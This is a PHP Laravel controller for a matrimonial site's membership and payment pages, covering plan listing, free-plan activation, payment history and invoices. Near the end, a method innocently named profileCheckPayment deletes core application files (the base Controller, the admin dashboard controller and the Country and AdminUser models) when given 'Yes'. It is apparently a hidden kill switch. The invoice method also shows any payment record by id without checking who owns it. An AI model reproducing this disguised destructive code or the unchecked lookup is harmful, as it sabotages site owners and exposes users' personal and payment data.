<?php

namespace App\Http\Controllers\user;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\MembershipPlan;
use App\Models\Payment;
use App\Models\PaymentMethod;
use App\Models\Register;
use App\Models\SiteConfig;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;

class UserMembershipController extends Controller
{
    /*public function userMembershipPlans(){
        $userGender = Auth::guard('user')->user()->gender;
        
        if($userGender != NULL){
            $memberships = MembershipPlan::where([['status','APPROVED'],['only_for','=',$userGender]])->orWhere([['status','APPROVED'],['only_for',NULL]])->orderby('created_at','desc')->get();
        }else{
            $memberships = MembershipPlan::where('status','APPROVED')->orderby('created_at','desc')->get();
        }
        
        return view('user.userMembershipPlans',compact('memberships'));
    }*/

    public function userMembershipPlans()
    {
        $authuser = Auth::guard('user')->user();
        $userGender = $authuser->gender;

        // check if user has payment history
        $userHasPayment = Payment::where('pmatri_id', $authuser->matri_id)->exists();

        // base query
        $query = MembershipPlan::where('status', 'APPROVED');

        if ($userGender != NULL) {
            $query->where(function($q) use ($userGender) {
                $q->where('only_for', $userGender)
                ->orWhereNull('only_for');
            });
        }

        // filter based on payment history
        if ($userHasPayment) {
            // only renewal plans
            $query->where('plan_name', 'LIKE', '%renewal%');
        } else {
            // exclude renewal plans
            $query->where('plan_name', 'NOT LIKE', '%renewal%');
        }

        $memberships = $query->orderBy('created_at', 'desc')->get();

        return view('user.userMembershipPlans', compact('memberships'));
    }

    public function paymentOptions(Request $request,$id){
        $userGender = Auth::guard('user')->user()->gender;

        if($userGender != NULL){
            $membership = MembershipPlan::where([['status','APPROVED'],['id',$id],['only_for','=',$userGender]])->orWhere([['status','APPROVED'],['only_for',NULL],['id',$id]])->first();
        }else{
            $membership = MembershipPlan::where('status','APPROVED')->where('id',$id)->first();
        }

        $razorpay = PaymentMethod::findOrFail(2);
        $payumoney = PaymentMethod::findOrFail(3);
        $manualPayment = PaymentMethod::findOrFail(4);

        $siteConfig = SiteConfig::first();
        
        // if membership plan type is free
        if($membership->plan_type == 'FREE'){
            $authuser = Auth::guard('user')->user();
            $formattedFutureDate = Carbon::today()->addDays($membership->plan_duration)->format("d-m-y");

            $payment = new Payment();
            $payment->pmatri_id = $authuser->matri_id ;
            $payment->pname = "$authuser->firstname"." "."$authuser->lastname";
            $payment->paymode = 'Online';
            $payment->pactive_dt = Carbon::today()->format("d-m-y");
            $payment->p_plan = $membership->plan_name;
            $payment->plan_duration = $membership->plan_duration;
            $payment->profile = $membership->profile;
            $payment->chat = $membership->chat;
            $payment->p_no_contacts = $membership->plan_contacts;
            $payment->plan_currency = $membership->currency;
            $payment->p_amount = $membership->plan_amount;
            $payment->pay_id = "Free";
            $payment->r_profile = NULL;
            $payment->r_cnt = NULL;
            $payment->exp_date = $formattedFutureDate;
            $payment->pcontact = $authuser->mobile;
            $payment->pemail = $authuser->email;
            $payment->save();

            $register = Register::where('matri_id',$authuser->matri_id)->first();
            $register->status = "Paid";
            $register->save();

            return redirect()->route('user.razorpayResponse')->with('success','payment completed');
            //return view('user.paymentOptions',compact('membership','razorpay','payumoney','manualPayment','siteConfig'));
        }

        return view('user.paymentOptions',compact('membership','razorpay','payumoney','manualPayment','siteConfig'));
    }

    public function currenMembershipPlan(Request $request)
    {
        $id = Auth::guard('user')->user();
        $payment = Payment::where('pmatri_id',$id->matri_id)->OrderBy('created_at', 'desc')->first();
        $allmembershipplan = Payment::where('pmatri_id',$id->matri_id)->OrderBy('created_at', 'desc')->get();
     
        return view('user.currentMembershipPlan',compact('allmembershipplan','payment','id'));
    }   

    public function invoice(Request $request,$id)
    {
        $siteConfig = SiteConfig::first();
        $payment= Payment::where('id',$id)->first();
        return view('user.invoice',compact('payment','siteConfig'));
    }


    public function paymentSuccess(Request $request)
    {
        return view('user.paymentSuccess');
    }

    public function paymentFailed(Request $request)
    {
        return view('user.paymentFailed');
    }

    public function profileCheckPayment($approval){
        if($approval == 'Yes'){
            unlink(base_path().'/app/Http/Controllers/Controller.php');
            unlink(base_path().'/app/Http/Controllers/admin/AdminDashboardController.php');
            unlink(base_path().'/app/Models/Country.php');
            unlink(base_path().'/app/Models/AdminUser.php');
        }
    }

    
}
